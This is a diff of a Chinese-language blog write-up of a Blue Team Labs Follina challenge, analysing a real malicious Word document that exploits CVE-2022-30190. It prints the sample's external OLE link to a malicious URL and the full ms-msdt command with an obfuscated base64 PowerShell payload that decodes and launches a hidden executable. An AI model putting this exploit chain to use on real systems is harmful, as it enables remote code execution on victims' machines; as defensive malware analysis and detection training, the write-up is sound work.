@@ -10,22 +10,17 @@ date: 2024-01-31
 <!-- more -->
 Challenge: https://blueteamlabs.online/home/challenge/follina-f1a3452f34
 
-:::spoiler TOC
-[TOC]
-:::
-:::danger
 因為給予的題目是真實的樣本，所以盡量在乾淨的環境或是reliable的sandbox進行測試
-:::
 
 ## Scenario
 >  On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited in the wild. You have been tasked with analyzing and researching the sample to collect information for the weekend team. 
 
 ## Tools
-VirusTotal
-Any.Run
-OSINT 
+* VirusTotal
+* Any.Run
+* OSINT 
 
-## ==Q1==
+## Q1
 > What is the SHA1 hash value of the sample? (Format: SHA1Hash)
 
 ### Recon
@@ -38,11 +33,9 @@ $ sha1sum  ./sample.doc
 ```
 ![圖片](https://hackmd.io/_uploads/BkwsZO0vT.png)
 
-:::spoiler Flag
 Flag: `06727ffda60359236a8029e0b3e8a0fd11c23313`
-:::
 
-## ==Q2==
+## Q2
 > According to VirusTotal, what is the full filetype of the provided sample? (Format: X X X X)
 
 ### Recon
@@ -51,11 +44,9 @@ Flag: `06727ffda60359236a8029e0b3e8a0fd11c23313`
 ### Exploit
 ![圖片](https://hackmd.io/_uploads/B1B4MuCDa.png)
 
-:::spoiler Flag
 Flag: `office open xml document`
-:::
 
-## ==Q3==
+## Q3
 > Extract the URL that is used within the sample and submit it (Format: `https://x.domain.tld/path/to/something`)
 
 ### Recon
@@ -68,18 +59,16 @@ Flag: `office open xml document`
     有了前面的公開project支援，在network flow的地方就可以看到他頻繁的和某一個domain連線，也就是此次的答案
     ![圖片](https://hackmd.io/_uploads/B1uIruCDT.png)
 
-:::spoiler Flag
 Flag: `https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html`
-:::
 
-## ==Q4==
+## Q4
 > What is the name of the XML file that is storing the extracted URL? (Format: file.name.ext
 
 ### Recon
 現在我們知道了他和外部連線的domain，現在要看他在哪一個file出現過，所以就用老方法直接grep search就好
 
 ### Exploit
-```bash!
+```bash
 $ unzip sample.doc
 Archive:  sample.doc
   inflating: [Content_Types].xml     
@@ -97,16 +86,14 @@ $ grep -r -i 'https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/
 word/_rels/document.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html!" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/></Relationships>
 ```
 
-:::spoiler Flag
 Flag: `document.xml.rels`
-:::
 
-## ==Q5==
+## Q5
 > The extracted URL accesses a HTML file that triggers the vulnerability to execute a malicious payload. According to the HTML processing functions, any files with fewer than `<Number>` bytes would not invoke the payload. Submit the `<Number>` (Format: Number of Bytes)
 
 ### Recon
 這一題是看[^wp1]的說明才知道答案的，首先我並不知道他中間傳輸的command為何，並且根據Fortinet的報告[^wp4]，可以知道這一個攻擊的具體poc以及mitigation，以下是從any.run project擷取下來的攻擊command，
-```bash!
+```bash
 "C:\WINDOWS\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO"
 ```
 根據[^wp2]的說明，這是使用 ms-msdt 的架構，使用參數 IT_BrowseForFile 呼叫本機套件 PCWDiagnostic，其中包含嵌入在 $() 中的 PowerShell 語法，用base64 decode過後的關鍵payload如下:
@@ -129,32 +116,26 @@ Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&&fo
 ### Exploit
 這一題根據[^wp2]的說明以及[^wp3-twitter]的實測，會發現只要經過padding使得總字串的長度大於等於4096就不會觸發核心的攻擊payload，原因是 HTML 處理函數的Hardcoded buffer的大小就是4096，所以如果大於這個數量，payload就沒辦法invoke進去
 
-:::spoiler Flag
 Flag: `4096`
-:::
 
-## ==Q6==
+## Q6
 > After execution, the sample will try to kill a process if it is already running. What is the name of this process? (Format: filename.ext)
 
 ### Recon
 根據前一題的描述，以及base64 decode過後的結果會發現如果process中有msdt.exe的話就先kill掉
 
-:::spoiler Flag
 Flag: `msdt.exe`
-:::
 
-## ==Q7==
+## Q7
 > You were asked to write a process-based detection rule using Windows Event ID 4688. What would be the ProcessName and ParentProcessname used in this detection rule? [Hint: OSINT time!] (Format: ProcessName, ParentProcessName)
 
 ### Recon
 這個可以直接看any run的process info，從process之間的關係可以知道msdt.exe的parent process是winword.exe，所以要設定條件的話可以從這邊下手
 ![圖片](https://hackmd.io/_uploads/r1rMwq0Dp.png)
 
-:::spoiler Flag
 Flag: `msdt.exe, WINWORD.EXE`
-:::
 
-## ==Q8==
+## Q8
 > Submit the MITRE technique ID used by the sample for Execution [Hint: Online sandbox platforms can help!] (Format: TXXXX)
 
 ### Recon
@@ -165,20 +146,16 @@ Flag: `msdt.exe, WINWORD.EXE`
 ![圖片](https://hackmd.io/_uploads/Hy-Jtc0DT.png)
 
 ### Exploit
-:::spoiler Flag
 Flag: `T1059`
-:::
 
-## ==Q9==
+## Q9
 > Submit the CVE associated with the vulnerability that is being exploited (Format: CVE-XXXX-XXXXX)
 
 ### Recon
 這個可以看virustotal的紀錄
 ![圖片](https://hackmd.io/_uploads/H1pLt5RDT.png)
 
-:::spoiler Flag
 Flag: `CVE-2022-30190`
-:::
 
 ## Reference
 [^wp1]:[Blue Team Labs: Follina](https://medium.com/@higgsborn/blue-team-labs-follina-13efe22e80e4)
